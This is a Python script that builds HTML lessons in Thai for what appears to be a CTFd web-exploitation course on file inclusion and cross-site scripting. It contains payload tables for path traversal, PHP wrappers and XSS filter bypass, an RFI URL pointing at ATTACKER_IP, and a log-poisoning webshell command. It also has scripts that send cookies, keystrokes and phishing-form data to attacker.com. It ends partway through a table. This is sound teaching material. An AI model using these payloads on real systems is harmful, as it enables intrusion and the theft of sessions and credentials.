import json
from CTFd import create_app
from CTFd.utils import markdown

# Load SVG templates from test scripts
import test_chapter5_svgs
import test_all_four_svgs

cmdi_svg = test_chapter5_svgs.cmdi_svg.strip()
xss_svg = test_all_four_svgs.xss_svg.strip()
lfi_svg = test_all_four_svgs.lfi_svg.strip()
brute_svg = test_all_four_svgs.brute_svg.strip()

# =========================================================================
# SECTION: FILE INCLUSION (LFI & RFI) MASTERCLASS
# =========================================================================
lfi_html = f"""<!-- ========================================== -->
<!-- FILE INCLUSION ATTACKS MASTERCLASS (LFI & RFI) -->
<!-- ========================================== -->
<div style="margin: 3.5rem auto 2rem; max-width: 1050px; background: linear-gradient(135deg, rgba(8, 14, 30, 0.98) 0%, rgba(25, 20, 10, 0.98) 100%); border: 1px solid rgba(251, 191, 36, 0.35); border-radius: 18px; box-shadow: 0 16px 45px rgba(0, 0, 0, 0.7), 0 0 35px rgba(251, 191, 36, 0.15); overflow: hidden;">
<div style="height: 4px; background: linear-gradient(90deg, #fbbf24, #f59e0b, #10b981, #00f0ff);"></div>

<div style="padding: 24px 28px 20px; border-bottom: 1px solid rgba(255, 255, 255, 0.08);">
<div style="display: flex; align-items: center; justify-content: space-between; flex-wrap: wrap; gap: 14px; margin-bottom: 16px;">
<div style="display: flex; align-items: center; gap: 14px;">
<div style="width: 56px; height: 56px; border-radius: 14px; background: radial-gradient(circle, rgba(251, 191, 36, 0.25) 0%, rgba(15, 23, 42, 0.9) 100%); border: 1.5px solid rgba(251, 191, 36, 0.55); display: flex; align-items: center; justify-content: center; font-size: 1.6rem; color: #fbbf24; box-shadow: 0 0 25px rgba(251, 191, 36, 0.35); flex-shrink: 0;">
<i class="fas fa-folder-open"></i>
</div>
<div>
<h3 style="margin: 0; color: #ffffff; font-size: 1.35rem; font-weight: 800; letter-spacing: -0.02em;">
📁 File Inclusion Attacks — การเรียกใช้ไฟล์ในเครื่อง (LFI) และภายนอก (RFI)
</h3>
<span style="color: #94a3b8; font-size: 0.82rem;">Chapter 5: Web Exploitations &bull; Copyright &copy; 2026 By Wongyos Keardsri (<a href="https://www.indusface.com/learning/file-inclusion-attacks/" target="_blank" style="color: #38bdf8; text-decoration: none;">Indusface Guide: What is File Inclusion Attacks</a>)</span>
</div>
</div>
<div style="display: flex; gap: 8px; flex-wrap: wrap;">
<span style="background: rgba(251, 191, 36, 0.15); color: #fde047; font-family: monospace; font-size: 0.72rem; font-weight: 800; padding: 4px 14px; border-radius: 20px; border: 1px solid rgba(251, 191, 36, 0.35);">
OWASP A01: ACCESS CONTROL
</span>
<span style="background: rgba(16, 185, 129, 0.15); color: #6ee7b7; font-family: monospace; font-size: 0.72rem; font-weight: 800; padding: 4px 14px; border-radius: 20px; border: 1px solid rgba(16, 185, 129, 0.35);">
CWE-98: PHP FILE INCLUSION
</span>
<span style="background: rgba(56, 189, 248, 0.15); color: #7dd3fc; font-family: monospace; font-size: 0.72rem; font-weight: 800; padding: 4px 14px; border-radius: 20px; border: 1px solid rgba(56, 189, 248, 0.35);">
CWE-22: PATH TRAVERSAL
</span>
</div>
</div>

<p style="color: #cbd5e1; font-size: 0.9rem; line-height: 1.75; margin: 0 0 14px;">
<strong>File Inclusion Attack</strong> คือช่องโหว่ความปลอดภัยที่เกิดขึ้นเมื่อเว็บแอปพลิเคชันอนุญาตให้ผู้ใช้งานส่งพาธหรือชื่อไฟล์ผ่านพารามิเตอร์ (เช่น <code>$_GET['page']</code>) เข้าไปประมวลผลในฟังก์ชันดึงไฟล์ เช่น <code>include()</code>, <code>require()</code>, <code>include_once()</code> หรือ <code>require_once()</code> ของภาษา PHP โดยปราศจากการตรวจสอบความถูกต้องอย่างรัดกุม ส่งผลให้ผู้ไม่ประสงค์ดีสามารถอ่านไฟล์ลับในระบบเซิร์ฟเวอร์ หรือสั่งรันโค้ดภาษา PHP จากระยะไกลได้ทันที
</p>

<div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(280px, 1fr)); gap: 14px; margin-top: 10px;">
<div style="background: rgba(15, 23, 42, 0.7); border: 1px solid rgba(251, 191, 36, 0.3); border-radius: 10px; padding: 14px;">
<div style="color: #fbbf24; font-weight: 800; font-size: 0.88rem; margin-bottom: 6px; display: flex; align-items: center; gap: 6px;">
<i class="fas fa-server"></i> 1. Local File Inclusion (LFI)
</div>
<div style="color: #94a3b8; font-size: 0.82rem; line-height: 1.6;">
การโจมตีเป้าหมายไฟล์ที่มีอยู่แล้วในเซิร์ฟเวอร์ท้องถิ่น เช่น ไฟล์คอนฟิกูเรชัน, ข้อมูลผู้ใช้ <code>/etc/passwd</code>, หรือการใช้ PHP Wrapper (<code>php://filter</code>) เพื่อขโมยดู Source Code หลังบ้าน
</div>
</div>
<div style="background: rgba(15, 23, 42, 0.7); border: 1px solid rgba(239, 68, 68, 0.3); border-radius: 10px; padding: 14px;">
<div style="color: #f87171; font-weight: 800; font-size: 0.88rem; margin-bottom: 6px; display: flex; align-items: center; gap: 6px;">
<i class="fas fa-globe"></i> 2. Remote File Inclusion (RFI)
</div>
<div style="color: #94a3b8; font-size: 0.82rem; line-height: 1.6;">
การบังคับให้เซิร์ฟเวอร์ดาวน์โหลดไฟล์สคริปต์อันตราย (Webshell) จากเซิร์ฟเวอร์ภายนอกของแฮกเกอร์ผ่านอินเทอร์เน็ตมารันสดๆ บนเครื่องเป้าหมาย นำไปสู่การยึดเซิร์ฟเวอร์โดยสมบูรณ์ (RCE)
</div>
</div>
</div>
</div>

<!-- Animated SVG -->
<div style="padding: 22px 28px 16px;">
<div style="display: flex; align-items: center; justify-content: space-between; margin-bottom: 12px; flex-wrap: wrap; gap: 8px;">
<span style="color: #fbbf24; font-family: monospace; font-size: 0.84rem; font-weight: 800; text-transform: uppercase; letter-spacing: 0.08em; display: flex; align-items: center; gap: 8px;">
<i class="fas fa-project-diagram"></i> แผนภาพจำลองสถาปัตยกรรม LFI &amp; RFI EXECUTION FLOW
</span>
<span style="background: rgba(251, 191, 36, 0.15); color: #fde047; font-family: monospace; font-size: 0.7rem; font-weight: 800; padding: 2px 8px; border-radius: 4px;">
ANIMATED PIPELINE
</span>
</div>
{lfi_svg}
</div>

<!-- File Inclusion Payloads Table -->
<div style="padding: 0 28px 24px; background: rgba(5, 8, 18, 0.85);">
<h4 style="margin: 16px 0 14px; color: #fbbf24; font-size: 0.95rem; font-weight: 800; text-transform: uppercase; letter-spacing: 0.06em; display: flex; align-items: center; gap: 8px;">
<i class="fas fa-list-check"></i> คลังเพย์โหลดการโจมตี File Inclusion (LFI &amp; RFI Payloads Table)
</h4>

<div style="background: rgba(15, 23, 42, 0.9); border: 1px solid rgba(251, 191, 36, 0.35); border-radius: 12px; overflow: hidden; box-shadow: 0 4px 20px rgba(0,0,0,0.5); margin-bottom: 20px;">
<div style="overflow-x: auto;">
<table style="width: 100%; border-collapse: collapse; font-size: 0.84rem; text-align: left;">
<thead>
<tr style="background: rgba(255,255,255,0.02); border-bottom: 1px solid rgba(255,255,255,0.06); font-size: 0.72rem; text-transform: uppercase; letter-spacing: 0.05em;">
<th style="padding: 12px 20px; color: #fbbf24; width: 38%;">คำสั่งเพย์โหลด (Payload)</th>
<th style="padding: 12px 20px; color: #94a3b8; width: 62%;">คำอธิบายการทำงานและจุดประสงค์ (Description)</th>
</tr>
</thead>
<tbody>
<tr style="border-bottom: 1px solid rgba(255,255,255,0.04);">
<td style="padding: 11px 20px; font-family: 'JetBrains Mono', monospace; font-weight: 700; color: #fbbf24;"><code style="background: #040711; padding: 4px 8px; border-radius: 6px; border: 1px solid rgba(255,255,255,0.06); color: #fbbf24;">../../../../etc/passwd</code></td>
<td style="padding: 11px 20px; color: #cbd5e1; line-height: 1.6;">Path Traversal ถอยไดเรกทอรีย้อนขึ้นไปที่ Root เพื่ออ่านรายชื่อบัญชีผู้ใช้ในระบบ Linux</td>
</tr>
<tr style="border-bottom: 1px solid rgba(255,255,255,0.04);">
<td style="padding: 11px 20px; font-family: 'JetBrains Mono', monospace; font-weight: 700; color: #fbbf24;"><code style="background: #040711; padding: 4px 8px; border-radius: 6px; border: 1px solid rgba(255,255,255,0.06); color: #fbbf24;">..\/..\/..\/..\/etc\/passwd</code></td>
<td style="padding: 11px 20px; color: #cbd5e1; line-height: 1.6;">ใช้ Backslash ผสมเพื่อหลบเลี่ยง Web Application Firewall (WAF) ที่ตรวจจับเฉพาะเครื่องหมาย <code>/</code> ปกติ</td>
</tr>
<tr style="border-bottom: 1px solid rgba(255,255,255,0.04);">
<td style="padding: 11px 20px; font-family: 'JetBrains Mono', monospace; font-weight: 700; color: #fbbf24;"><code style="background: #040711; padding: 4px 8px; border-radius: 6px; border: 1px solid rgba(255,255,255,0.06); color: #fbbf24;">....//....//....//etc/passwd</code></td>
<td style="padding: 11px 20px; color: #cbd5e1; line-height: 1.6;">หลบเลี่ยงตัวกรองที่ตัดคำว่า <code>../</code> แบบรอบเดียว (Non-recursive Filter Bypass) เมื่อตัดเสร็จจะคงเหลือเป็น <code>../</code></td>
</tr>
<tr style="border-bottom: 1px solid rgba(255,255,255,0.04);">
<td style="padding: 11px 20px; font-family: 'JetBrains Mono', monospace; font-weight: 700; color: #fbbf24;"><code style="background: #040711; padding: 4px 8px; border-radius: 6px; border: 1px solid rgba(255,255,255,0.06); color: #fbbf24;">%2e%2e%2f%2e%2e%2fetc%2fpasswd</code></td>
<td style="padding: 11px 20px; color: #cbd5e1; line-height: 1.6;">URL Encoding สำหรับแปลง <code>..</code> เป็น <code>%2e%2e</code> และ <code>/</code> เป็น <code>%2f</code> เพื่อส่งข้ามตัวกรอง HTTP</td>
</tr>
<tr style="border-bottom: 1px solid rgba(255,255,255,0.04);">
<td style="padding: 11px 20px; font-family: 'JetBrains Mono', monospace; font-weight: 700; color: #fbbf24;"><code style="background: #040711; padding: 4px 8px; border-radius: 6px; border: 1px solid rgba(255,255,255,0.06); color: #fbbf24;">/etc/passwd%00</code></td>
<td style="padding: 11px 20px; color: #cbd5e1; line-height: 1.6;">Null Byte Injection (<code>%00</code>) ตัดส่วนขยายไฟล์ที่ระบบพ่วงท้าย เช่น <code>.php</code> (ใช้ได้กับ PHP &lt; 5.3.4)</td>
</tr>
<tr style="border-bottom: 1px solid rgba(255,255,255,0.04);">
<td style="padding: 11px 20px; font-family: 'JetBrains Mono', monospace; font-weight: 700; color: #fbbf24;"><code style="background: #040711; padding: 4px 8px; border-radius: 6px; border: 1px solid rgba(255,255,255,0.06); color: #fbbf24;">php://filter/convert.base64-encode/resource=index.php</code></td>
<td style="padding: 11px 20px; color: #cbd5e1; line-height: 1.6;">ใช้ PHP Stream Wrapper แปลง Source Code เป็น Base64 ทำให้อ่านโค้ดลับของหน้าเว็บได้โดยไม่ถูก PHP รัน</td>
</tr>
<tr style="border-bottom: 1px solid rgba(255,255,255,0.04);">
<td style="padding: 11px 20px; font-family: 'JetBrains Mono', monospace; font-weight: 700; color: #fbbf24;"><code style="background: #040711; padding: 4px 8px; border-radius: 6px; border: 1px solid rgba(255,255,255,0.06); color: #fbbf24;">php://input</code></td>
<td style="padding: 11px 20px; color: #cbd5e1; line-height: 1.6;">สตรีมรับข้อมูลคำสั่ง PHP สดๆ จาก Request Body ของคำขอ HTTP POST ไปประมวลผลทันที</td>
</tr>
<tr style="border-bottom: 1px solid rgba(255,255,255,0.04);">
<td style="padding: 11px 20px; font-family: 'JetBrains Mono', monospace; font-weight: 700; color: #fbbf24;"><code style="background: #040711; padding: 4px 8px; border-radius: 6px; border: 1px solid rgba(255,255,255,0.06); color: #fbbf24;">data://text/plain;base64,&lt;PAYLOAD&gt;</code></td>
<td style="padding: 11px 20px; color: #cbd5e1; line-height: 1.6;">ส่งข้อมูลโค้ด PHP แบบ Inline Data URI เข้ารหัส Base64 ให้เซิร์ฟเวอร์รันโค้ดทันที</td>
</tr>
<tr style="border-bottom: 1px solid rgba(255,255,255,0.04);">
<td style="padding: 11px 20px; font-family: 'JetBrains Mono', monospace; font-weight: 700; color: #fbbf24;"><code style="background: #040711; padding: 4px 8px; border-radius: 6px; border: 1px solid rgba(255,255,255,0.06); color: #fbbf24;">http://&lt;ATTACKER_IP&gt;/shell.txt</code></td>
<td style="padding: 11px 20px; color: #cbd5e1; line-height: 1.6;">Remote File Inclusion (RFI) ดึงไฟล์ Webshell จากภายนอกมารัน (ต้องการ <code>allow_url_include = On</code>)</td>
</tr>
<tr>
<td style="padding: 11px 20px; font-family: 'JetBrains Mono', monospace; font-weight: 700; color: #fbbf24;"><code style="background: #040711; padding: 4px 8px; border-radius: 6px; border: 1px solid rgba(255,255,255,0.06); color: #fbbf24;">/var/log/apache2/access.log</code></td>
<td style="padding: 11px 20px; color: #cbd5e1; line-height: 1.6;">Log Poisoning โจมตีโดยการฉีดโค้ด PHP ลงใน User-Agent แล้วสั่ง LFI ดึงล็อกไฟล์มารันโค้ด</td>
</tr>
</tbody>
</table>
</div>
</div>

<!-- Real Code & Action Examples -->
<h4 style="margin: 0 0 14px; color: #38bdf8; font-size: 0.95rem; font-weight: 800; text-transform: uppercase; letter-spacing: 0.06em; display: flex; align-items: center; gap: 8px;">
<i class="fas fa-code"></i> สถาปัตยกรรมโค้ดช่องโหว่และการทดสอบเจาะจริง (Vulnerability in Action)
</h4>

<div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(310px, 1fr)); gap: 14px;">
<div style="background: #040711; border: 1px solid rgba(251, 191, 36, 0.25); border-radius: 10px; padding: 14px;">
<div style="color: #fde047; font-weight: bold; font-size: 0.8rem; margin-bottom: 6px;"># 1. โค้ด PHP ที่มีช่องโหว่ (Vulnerable PHP Code)</div>
<pre style="background: #02040a; padding: 8px 12px; border-radius: 6px; margin: 0; font-size: 0.74rem; color: #e2e8f0; overflow-x: auto;"><code>&lt;?php
    $page = $_GET['page'];
    // ไร้การตรวจสอบ Whitelist หรือ Sanitization
    include($page);
?&gt;</code></pre>
</div>
<div style="background: #040711; border: 1px solid rgba(56, 189, 248, 0.25); border-radius: 10px; padding: 14px;">
<div style="color: #7dd3fc; font-weight: bold; font-size: 0.8rem; margin-bottom: 6px;"># 2. การดึงอ่าน Source Code ด้วย PHP Filter</div>
<pre style="background: #02040a; padding: 8px 12px; border-radius: 6px; margin: 0; font-size: 0.74rem; color: #e2e8f0; overflow-x: auto;"><code>curl "http://target.com/index.php?page=php://filter/convert.base64-encode/resource=secret_config"
# นำสตริง Base64 ที่ได้มาถอดรหัส:
echo "PD9waHAgJGZsYWc9J0ZMQ...==" | base64 -d</code></pre>
</div>
<div style="background: #040711; border: 1px solid rgba(239, 68, 68, 0.25); border-radius: 10px; padding: 14px;">
<div style="color: #fca5a5; font-weight: bold; font-size: 0.8rem; margin-bottom: 6px;"># 3. Log Poisoning สู่ Remote Code Execution</div>
<pre style="background: #02040a; padding: 8px 12px; border-radius: 6px; margin: 0; font-size: 0.74rem; color: #e2e8f0; overflow-x: auto;"><code># 1. ฉีด PHP ลงใน Apache Access Log
curl -A "&lt;?php system(\$_GET['c']); ?&gt;" http://target.com/
# 2. ดึงรัน Log ผ่าน LFI
curl "http://target.com/index.php?page=/var/log/apache2/access.log&amp;c=id"</code></pre>
</div>
</div>

</div>
</div>"""

clean_lfi = '\n'.join([l.lstrip() for l in lfi_html.split('\n')])

# =========================================================================
# SECTION: CROSS-SITE SCRIPTING (XSS) & XSSTRIKE MASTERCLASS
# =========================================================================
xss_html = f"""<!-- ========================================== -->
<!-- CROSS-SITE SCRIPTING (XSS) & XSSTRIKE MASTERCLASS -->
<!-- ========================================== -->
<div style="margin: 3.5rem auto 2rem; max-width: 1050px; background: linear-gradient(135deg, rgba(8, 14, 30, 0.98) 0%, rgba(20, 10, 30, 0.98) 100%); border: 1px solid rgba(168, 85, 247, 0.35); border-radius: 18px; box-shadow: 0 16px 45px rgba(0, 0, 0, 0.7), 0 0 35px rgba(168, 85, 247, 0.15); overflow: hidden;">
<div style="height: 4px; background: linear-gradient(90deg, #a855f7, #ec4899, #38bdf8, #10b981);"></div>

<div style="padding: 24px 28px 20px; border-bottom: 1px solid rgba(255, 255, 255, 0.08);">
<div style="display: flex; align-items: center; justify-content: space-between; flex-wrap: wrap; gap: 14px; margin-bottom: 16px;">
<div style="display: flex; align-items: center; gap: 14px;">
<div style="width: 56px; height: 56px; border-radius: 14px; background: radial-gradient(circle, rgba(168, 85, 247, 0.25) 0%, rgba(15, 23, 42, 0.9) 100%); border: 1.5px solid rgba(168, 85, 247, 0.55); display: flex; align-items: center; justify-content: center; font-size: 1.6rem; color: #c084fc; box-shadow: 0 0 25px rgba(168, 85, 247, 0.35); flex-shrink: 0;">
<i class="fas fa-shield-virus"></i>
</div>
<div>
<h3 style="margin: 0; color: #ffffff; font-size: 1.35rem; font-weight: 800; letter-spacing: -0.02em;">
⚡ Cross-Site Scripting (XSS) &amp; ชุดเครื่องมือทดสอบ XSStrike
</h3>
<span style="color: #94a3b8; font-size: 0.82rem;">Chapter 5: Web Exploitations &bull; Copyright &copy; 2026 By Wongyos Keardsri (<a href="https://spanning.com/blog/cross-site-scripting-explained/" target="_blank" style="color: #38bdf8; text-decoration: none;">Spanning Guide: Cross-Site Scripting Explained</a>)</span>
</div>
</div>
<div style="display: flex; gap: 8px; flex-wrap: wrap;">
<span style="background: rgba(168, 85, 247, 0.15); color: #d8b4fe; font-family: monospace; font-size: 0.72rem; font-weight: 800; padding: 4px 14px; border-radius: 20px; border: 1px solid rgba(168, 85, 247, 0.35);">
OWASP A03: INJECTION
</span>
<span style="background: rgba(236, 72, 153, 0.15); color: #f472b6; font-family: monospace; font-size: 0.72rem; font-weight: 800; padding: 4px 14px; border-radius: 20px; border: 1px solid rgba(236, 72, 153, 0.35);">
CWE-79: CLIENT SCRIPT
</span>
<span style="background: rgba(56, 189, 248, 0.15); color: #7dd3fc; font-family: monospace; font-size: 0.72rem; font-weight: 800; padding: 4px 14px; border-radius: 20px; border: 1px solid rgba(56, 189, 248, 0.35);">
AUTOMATION: XSSTRIKE
</span>
</div>
</div>

<p style="color: #cbd5e1; font-size: 0.9rem; line-height: 1.75; margin: 0 0 14px;">
<strong>Cross-Site Scripting (XSS)</strong> คือช่องโหว่ความปลอดภัยฝั่งไคลเอนต์ (Client-Side) ที่เปิดโอกาสให้ผู้โจมตีสามารถ <strong>ฉีดสคริปต์อันตราย (Malicious JavaScript)</strong> เข้าไปในหน้าเว็บที่ผู้ใช้อื่นไว้วางใจ เมื่อผู้ใช้งานคนอื่นเข้าชมหน้าเว็บดังกล่าว เบราว์เซอร์จะประมวลผลโค้ดสคริปต์นั้นภายใต้ Security Context ของผู้ใช้ ส่งผลให้แฮกเกอร์สามารถขโมย Cookie, Session Token, บันทึกการกดคีย์บอร์ด (Keylogger), หรือหลอกล่อให้ผู้ใช้กรอกรหัสผ่านซ้ำ (Phishing)
</p>

<!-- The 3 Pillars of XSS -->
<div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(280px, 1fr)); gap: 14px; margin-top: 10px;">
<div style="background: rgba(15, 23, 42, 0.7); border: 1px solid rgba(56, 189, 248, 0.3); border-radius: 10px; padding: 14px;">
<div style="color: #38bdf8; font-weight: 800; font-size: 0.88rem; margin-bottom: 6px; display: flex; align-items: center; gap: 6px;">
<i class="fas fa-undo-alt"></i> 1. Reflected XSS
</div>
<div style="color: #94a3b8; font-size: 0.82rem; line-height: 1.6;">
สคริปต์สะท้อนกลับทันทีจากคำขอ HTTP เช่น URL Query Parameter โดยไม่ถูกบันทึกลงฐานข้อมูล แฮกเกอร์มักส่งลิงก์หลอกให้เหยื่อกดเปิดเพื่อโจมตีเหยื่อเฉพาะราย
</div>
</div>
<div style="background: rgba(15, 23, 42, 0.7); border: 1px solid rgba(236, 72, 153, 0.3); border-radius: 10px; padding: 14px;">
<div style="color: #f472b6; font-weight: 800; font-size: 0.88rem; margin-bottom: 6px; display: flex; align-items: center; gap: 6px;">
<i class="fas fa-database"></i> 2. Stored XSS (Persistent)
</div>
<div style="color: #94a3b8; font-size: 0.82rem; line-height: 1.6;">
สคริปต์ถูกบันทึกลงในฐานข้อมูลอย่างถาวร (เช่น ช่องคอมเมนต์, กระทู้เว็บบอร์ด) ทุกครั้งที่มีใครเปิดหน้านี้ สคริปต์จะถูกส่งไปรันในเครื่องของผู้เข้าชมทุกคนโดยอัตโนมัติ อันตรายระดับสูงสุด!
</div>
</div>
<div style="background: rgba(15, 23, 42, 0.7); border: 1px solid rgba(168, 85, 247, 0.3); border-radius: 10px; padding: 14px;">
<div style="color: #c084fc; font-weight: 800; font-size: 0.88rem; margin-bottom: 6px; display: flex; align-items: center; gap: 6px;">
<i class="fas fa-code-branch"></i> 3. DOM-Based XSS
</div>
<div style="color: #94a3b8; font-size: 0.82rem; line-height: 1.6;">
ช่องโหว่เกิดขึ้นที่โค้ด JavaScript ฝั่งหน้าบ้าน (Client-side DOM) โดยตรง เช่น มีการอ่าน <code>location.hash</code> หรือ <code>document.referrer</code> แล้วเขียนลง DOM ผ่าน <code>innerHTML</code> โดยไม่ผ่านเซิร์ฟเวอร์เลย
</div>
</div>
</div>
</div>

<!-- Animated SVG -->
<div style="padding: 22px 28px 16px;">
<div style="display: flex; align-items: center; justify-content: space-between; margin-bottom: 12px; flex-wrap: wrap; gap: 8px;">
<span style="color: #c084fc; font-family: monospace; font-size: 0.84rem; font-weight: 800; text-transform: uppercase; letter-spacing: 0.08em; display: flex; align-items: center; gap: 8px;">
<i class="fas fa-project-diagram"></i> แผนภาพจำลองสถาปัตยกรรม XSS ATTACK PIPELINE (VICTIM CONTEXT HIJACK)
</span>
<span style="background: rgba(168, 85, 247, 0.15); color: #d8b4fe; font-family: monospace; font-size: 0.7rem; font-weight: 800; padding: 2px 8px; border-radius: 4px;">
ANIMATED PIPELINE
</span>
</div>
{xss_svg}
</div>

<!-- XSS Real Weaponization Scenarios -->
<div style="padding: 0 28px 20px; background: rgba(5, 8, 18, 0.85);">
<h4 style="margin: 16px 0 14px; color: #ec4899; font-size: 0.95rem; font-weight: 800; text-transform: uppercase; letter-spacing: 0.06em; display: flex; align-items: center; gap: 8px;">
<i class="fas fa-skull-crossbones"></i> 3 รูปแบบภัยคุกคามจริงของ XSS (Real Weaponization Impact)
</h4>

<div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(310px, 1fr)); gap: 14px; margin-bottom: 22px;">
<div style="background: #040711; border: 1px solid rgba(236, 72, 153, 0.25); border-radius: 10px; padding: 14px;">
<div style="color: #f472b6; font-weight: bold; font-size: 0.82rem; margin-bottom: 6px;">🍪 1. การขโมย Cookie &amp; Session (Cookie Theft)</div>
<pre style="background: #02040a; padding: 8px 12px; border-radius: 6px; margin: 0; font-size: 0.72rem; color: #e2e8f0; overflow-x: auto;"><code>&lt;script&gt;
  fetch('http://attacker.com/steal?c=' + encodeURIComponent(document.cookie));
&lt;/script&gt;</code></pre>
<div style="color: #94a3b8; font-size: 0.76rem; margin-top: 6px;">ส่ง Session Cookie ของเหยื่อไปยังเซิร์ฟเวอร์แฮกเกอร์เพื่อสวมรอยเข้าสู่ระบบ</div>
</div>

<div style="background: #040711; border: 1px solid rgba(56, 189, 248, 0.25); border-radius: 10px; padding: 14px;">
<div style="color: #38bdf8; font-weight: bold; font-size: 0.82rem; margin-bottom: 6px;">⌨️ 2. ดักการกดแป้นพิมพ์ (JavaScript Keylogger)</div>
<pre style="background: #02040a; padding: 8px 12px; border-radius: 6px; margin: 0; font-size: 0.72rem; color: #e2e8f0; overflow-x: auto;"><code>&lt;script&gt;
  document.addEventListener('keypress', function(e) {{
    fetch('http://attacker.com/k?k=' + e.key);
  }});
&lt;/script&gt;</code></pre>
<div style="color: #94a3b8; font-size: 0.76rem; margin-top: 6px;">ดักจับทุกปุ่มที่เหยื่อกดพิมพ์ในหน้าเว็บ เช่น เลขบัตรเครดิต หรือข้อความส่วนตัว</div>
</div>

<div style="background: #040711; border: 1px solid rgba(168, 85, 247, 0.25); border-radius: 10px; padding: 14px;">
<div style="color: #c084fc; font-weight: bold; font-size: 0.82rem; margin-bottom: 6px;">🎣 3. ฟิชชิ่งฟอร์มล็อกอินปลอม (Phishing Injection)</div>
<pre style="background: #02040a; padding: 8px 12px; border-radius: 6px; margin: 0; font-size: 0.72rem; color: #e2e8f0; overflow-x: auto;"><code>&lt;div style="position:fixed;top:0;left:0;width:100%;height:100%;background:#0b1224;z-index:9999;"&gt;
  &lt;h3&gt;Session หมดอายุ โปรดล็อกอินใหม่&lt;/h3&gt;
  &lt;form action="http://attacker.com/steal" method="POST"&gt;...&lt;/form&gt;
&lt;/div&gt;</code></pre>
<div style="color: #94a3b8; font-size: 0.76rem; margin-top: 6px;">แสดงฟอร์มล็อกอินซ้อนทับหน้าเว็บจริงเพื่อหลอกให้ผู้ใช้กรอกรหัสผ่านส่งตรงไปยังแฮกเกอร์</div>
</div>
</div>

<!-- Common XSS Payloads Table -->
<h4 style="margin: 0 0 14px; color: #fbbf24; font-size: 0.95rem; font-weight: 800; text-transform: uppercase; letter-spacing: 0.06em; display: flex; align-items: center; gap: 8px;">
<i class="fas fa-list-check"></i> คลังเพย์โหลดคำสั่ง XSS ยอดนิยม (Common XSS Payloads Table)
</h4>

<div style="background: rgba(15, 23, 42, 0.9); border: 1px solid rgba(168, 85, 247, 0.35); border-radius: 12px; overflow: hidden; box-shadow: 0 4px 20px rgba(0,0,0,0.5); margin-bottom: 22px;">
<div style="overflow-x: auto;">
<table style="width: 100%; border-collapse: collapse; font-size: 0.84rem; text-align: left;">
<thead>
<tr style="background: rgba(255,255,255,0.02); border-bottom: 1px solid rgba(255,255,255,0.06); font-size: 0.72rem; text-transform: uppercase; letter-spacing: 0.05em;">
<th style="padding: 12px 20px; color: #c084fc; width: 44%;">คำสั่งเพย์โหลด (Payload)</th>
<th style="padding: 12px 20px; color: #94a3b8; width: 56%;">เทคนิคและการหลบเลี่ยงตัวกรอง (Technique &amp; Purpose)</th>
</tr>
</thead>
<tbody>
<tr style="border-bottom: 1px solid rgba(255,255,255,0.04);">
<td style="padding: 11px 20px; font-family: 'JetBrains Mono', monospace; font-weight: 700; color: #c084fc;"><code style="background: #040711; padding: 4px 8px; border-radius: 6px; border: 1px solid rgba(255,255,255,0.06); color: #c084fc;">&lt;script&gt;alert(1)&lt;/script&gt;</code></td>
<td style="padding: 11px 20px; color: #cbd5e1; line-height: 1.6;">เพย์โหลดพื้นฐานมาตรฐานสำหรับตรวจสอบว่าเว็บมีช่องโหว่ XSS หรือไม่ (Proof-of-Concept)</td>
</tr>
<tr style="border-bottom: 1px solid rgba(255,255,255,0.04);">
<td style="padding: 11px 20px; font-family: 'JetBrains Mono', monospace; font-weight: 700; color: #c084fc;"><code style="background: #040711; padding: 4px 8px; border-radius: 6px; border: 1px solid rgba(255,255,255,0.06); color: #c084fc;">&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code></td>
<td style="padding: 11px 20px; color: #cbd5e1; line-height: 1.6;">สั่งแสดงกล่องข้อความที่มีค่าคุกกี้เซสชันของเบราว์เซอร์ เพื่อพิสูจน์การเข้าถึงข้อมูลประจำตัว</td>
</tr>
<tr style="border-bottom: 1px solid rgba(255,255,255,0.04);">
<td style="padding: 11px 20px; font-family: 'JetBrains Mono', monospace; font-weight: 700; color: #c084fc;"><code style="background: #040711; padding: 4px 8px; border-radius: 6px; border: 1px solid rgba(255,255,255,0.06); color: #c084fc;">&lt;img src=x onerror=alert(1)&gt;</code></td>
<td style="padding: 11px 20px; color: #cbd5e1; line-height: 1.6;">หลบเลี่ยงตัวกรองที่บล็อกคำว่า <code>&lt;script&gt;</code> โดยอาศัย Image Event Handler <code>onerror</code></td>
</tr>
<tr style="border-bottom: 1px solid rgba(255,255,255,0.04);">
<td style="padding: 11px 20px; font-family: 'JetBrains Mono', monospace; font-weight: 700; color: #c084fc;"><code style="background: #040711; padding: 4px 8px; border-radius: 6px; border: 1px solid rgba(255,255,255,0.06); color: #c084fc;">&lt;svg onload=alert(1)&gt;</code></td>
<td style="padding: 11px 20px; color: #cbd5e1; line-height: 1.6;">ใช้ SVG Element เพื่อรัน JavaScript ผ่าน Event <code>onload</code> ทันทีที่มีการแสดงผล</td>
</tr>
<tr style="border-bottom: 1px solid rgba(255,255,255,0.04);">
<td style="padding: 11px 20px; font-family: 'JetBrains Mono', monospace; font-weight: 700; color: #c084fc;"><code style="background: #040711; padding: 4px 8px; border-radius: 6px; border: 1px solid rgba(255,255,255,0.06); color: #c084fc;">&lt;iframe src="javascript:alert(1)"&gt;&lt;/iframe&gt;</code></td>
<td style="padding: 11px 20px; color: #cbd5e1; line-height: 1.6;">รันสคริปต์ผ่าน <code>javascript:</code> Pseudo-Protocol ภายใน iframe</td>
</tr>
<tr style="border-bottom: 1px solid rgba(255,255,255,0.04);">
<td style="padding: 11px 20px; font-family: 'JetBrains Mono', monospace; font-weight: 700; color: #c084fc;"><code style="background: #040711; padding: 4px 8px; border-radius: 6px; border: 1px solid rgba(255,255,255,0.06); color: #c084fc;">&lt;body onload=alert(1)&gt;</code></td>
<td style="padding: 11px 20px; color: #cbd5e1; line-height: 1.6;">แทรก Event Handler ลงบน <code>&lt;body&gt;</code> เพื่อให้ทำงานทันทีที่เพจโหลดเสร็จสมบูรณ์</td>
</tr>
<tr style="border-bottom: 1px solid rgba(255,255,255,0.04);">
<td style="padding: 11px 20px; font-family: 'JetBrains Mono', monospace; font-weight: 700; color: #c084fc;"><code style="background: #040711; padding: 4px 8px; border-radius: 6px; border: 1px solid rgba(255,255,255,0.06); color: #c084fc;">&lt;input type="text" autofocus onfocus=alert(1)&gt;</code></td>
